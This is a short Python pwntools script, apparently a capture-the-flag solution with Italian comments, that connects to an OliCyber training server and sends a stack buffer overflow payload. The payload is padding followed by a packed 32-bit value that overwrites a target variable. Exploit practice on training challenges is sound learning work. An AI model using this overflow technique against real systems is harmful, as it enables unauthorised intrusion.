#Classico esempio di buffer overflow
from pwn import *

def main():

    conn = remote('lil-overflow.challs.olicyber.it', 34002)
    
    conn.recvuntil(b"Hello, what's your name?\n")
    
    v7_value = 95099824           # Valore target
    payload = b'A' * 32           # Riempie il buffer (32 byte)
    payload += b'B' * 8          # offset di 8 byte
    payload += p32(v7_value)      # Sovrascrive v7 con `p32` per un integer a 32 bit
    print(f'payload: {payload}')
    
    conn.sendline(payload)

    response = conn.recvall()
    print(response[64:-1])
    

if __name__ == "__main__":
    main()